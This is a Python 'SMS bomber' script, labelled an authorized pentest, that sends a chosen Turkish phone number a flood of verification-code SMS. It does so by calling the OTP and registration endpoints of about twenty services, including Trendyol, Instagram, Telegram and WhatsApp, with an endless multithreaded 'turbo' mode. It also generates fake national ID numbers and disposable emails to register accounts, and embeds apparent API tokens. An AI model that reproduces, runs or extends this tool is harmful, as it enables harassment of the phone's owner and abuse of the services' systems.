#!/usr/bin/env python3
import os,sys,time,random,string,threading
from concurrent.futures import ThreadPoolExecutor,wait
try:
    import requests
    from colorama import Fore,Style,init
    init(convert=True)
except ImportError:
    os.system(f'"{sys.executable}" -m pip install requests colorama')
    import requests
    from colorama import Fore,Style,init
    init(convert=True)

def tc():
    r=[random.randint(1,9)]
    for _ in range(1,9):r.append(random.randint(0,9))
    r.append(((sum(r[0:9:2])*7)-sum(r[1:9:2]))%10)
    r.append(sum(r[0:10])%10)
    return ''.join(str(x) for x in r)

class S:
    c=0;l=threading.Lock()
    def __init__(s,p,m=""):
        s.p=str(p);s.t=tc()
        s.m=m if m and"@"in m else''.join(random.choice(string.ascii_lowercase) for _ in range(22))+"@gmail.com"
    def o(s,sv):
        with s.l:s.c+=1
        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL}{s.p}->{sv}")
    def n(s,sv):
        print(f"{Fore.LIGHTRED_EX}[-]{Style.RESET_ALL}{s.p}->{sv}")
    def _(s,u,h,j=None,d=None,sv="",sc=(200,)):
        try:
            r=requests.post(u,headers=h,json=j,data=d,timeout=5)if j or d else requests.get(u,headers=h,timeout=5)
            s.o(sv)if r.status_code in sc else 1/0
        except:s.n(sv)
    def k1(s):s._("https://core.kahvedunyasi.com/api/users/sms/send",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.kahvedunyasi.com"},{"gsm":s.p,"kvkk":True},sv="KahveDunyasi")
    def k2(s):s._("https://www.money.com.tr/Account/ValidateAndSendOTP",{"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest"},d={"phone":f"{s.p[:3]} {s.p[3:10]}","GRecaptchaResponse":""},sv="Money")
    def k3(s):s._("https://www.alixavien.com.tr/api/member/sendOtp",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.alixavien.com.tr"},{"Phone":s.p,"XID":""},sv="Alixavien")
    def k4(s):s._(f"https://www.jimmykey.com/tr/p/User/SendConfirmationSms?gsm={s.p}&gRecaptchaResponse=undefined",{"User-Agent":"Mozilla/5.0"},sv="Jimmykey")
    def k5(s):s._("https://api.ido.com.tr/idows/v2/register",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.ido.com.tr"},{"birthDate":True,"captcha":"","checkPwd":"313131","code":"","day":24,"email":s.m,"firstName":"TEST","gender":"MALE","lastName":"USER","mobileNumber":f"0{s.p}","month":9,"pwd":"313131","tckn":s.t,"termsOfUse":True,"year":1977},sv="IDO",sc=(200,))
    def k6(s):s._("https://www.trendyol.com/auth/sendSms",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.trendyol.com"},{"phoneNumber":s.p},sv="Trendyol")
    def k7(s):s._("https://auth.hepsiburada.com/api/send-sms",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.hepsiburada.com"},{"phone":s.p,"countryCode":"TR"},sv="Hepsiburada")
    def k8(s):s._("https://www.n11.com/api/v1/auth/sendSmsVerificationCode",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.n11.com"},{"gsmNumber":s.p},sv="N11")
    def k9(s):s._("https://www.turkcell.com.tr/api/otp/send",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.turkcell.com.tr"},{"msisdn":s.p,"channel":"SMS"},sv="Turkcell")
    def k10(s):s._("https://api.sahibinden.com/api/auth/v2/otp/send",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.sahibinden.com"},{"phone":s.p,"type":"REGISTER"},sv="Sahibinden")
    def k11(s):s._("https://user.getir.com/api/v1/auth/send-sms",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.getir.com"},{"phoneNumber":s.p},sv="Getir",sc=(200,201))
    def k12(s):s._("https://www.migros.com.tr/api/auth/send-sms-code",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.migros.com.tr"},{"gsm":s.p},sv="Migros")
    def k13(s):s._("https://www.a101.com.tr/api/auth/send-sms",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.a101.com.tr"},{"phone":s.p},sv="A101")
    def k14(s):s._("https://www.bim.com.tr/api/auth/send-sms",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.bim.com.tr"},{"gsm":s.p},sv="Bim")
    def k15(s):s._("https://www.istanbulkart.istanbul/api/auth/send-sms",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://www.istanbulkart.istanbul"},{"phoneNumber":s.p},sv="Istanbulkart")
    def k16(s):s._("https://i.instagram.com/api/v1/accounts/send_two_factor_login_sms/",{"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded","X-IG-App-ID":"936619743392459"},d={"phone_number":s.p,"country_code":"90"},sv="Instagram")
    def k17(s):s._("https://api.twitter.com/1.1/account/login_verification.json",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Authorization":"Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA"},{"phone_number":s.p,"country_code":"90"},sv="Twitter")
    def k18(s):s._("https://auth.telegram.org/api/sendCode",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json"},{"phone_number":f"90{s.p}","api_id":17349,"api_hash":"344583e45741c457fe1862106095a5eb"},sv="Telegram")
    def k19(s):s._("https://discord.com/api/v9/auth/sms/send",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Origin":"https://discord.com"},{"phone":s.p,"country_code":"90"},sv="Discord")
    def k20(s):s._("https://v6.whatsapp.net/v2/code",{"User-Agent":"Mozilla/5.0","Content-Type":"application/json"},{"cc":"90","phone_number":s.p,"method":"sms"},sv="WhatsApp")

def main():
    os.system("cls"if os.name=="nt"else"clear")
    print(f"{Fore.LIGHTCYAN_EX}SMS Bomber - Authorized Pentest{Style.RESET_ALL}")
    sv=[a for a in dir(S)if not a.startswith("_")and callable(getattr(S,a))]
    print(f"{len(sv)} providers loaded\n")
    p=input("Phone (5XX,10 digits): ").strip()
    if not p.isdigit()or len(p)!=10:print("Invalid!");input();return
    print("1-Sequential\n2-Turbo");c=input("Choice: ").strip()
    b=S(p)
    if c=="2":
        try:t=int(input(f"Threads [1-{len(sv)}]: ").strip());t=max(1,min(t,len(sv)))
        except:t=5
        print("\nTurbo mode... Ctrl+C\n")
        try:
            while True:
                with ThreadPoolExecutor(max_workers=t)as ex:wait([ex.submit(getattr(b,s))for s in sv])
        except KeyboardInterrupt:pass
    else:
        try:k=input("Count (empty=inf): ").strip();k=int(k)if k else None
        except:k=None
        d=float(input("Delay sec: ").strip())if not k or k>1 else 0
        sn=0
        try:
            while True:
                for s in sv:
                    if k and sn>=k:break
                    getattr(b,s)();sn+=1;time.sleep(d)
                if k and sn>=k:break
        except KeyboardInterrupt:pass
    print(f"\nTotal: {b.c}");input("Enter...")

if __name__=="__main__":
    try:main()
    except KeyboardInterrupt:print("\nStopped.")
    except Exception as e:print(f"Error:{e}");input()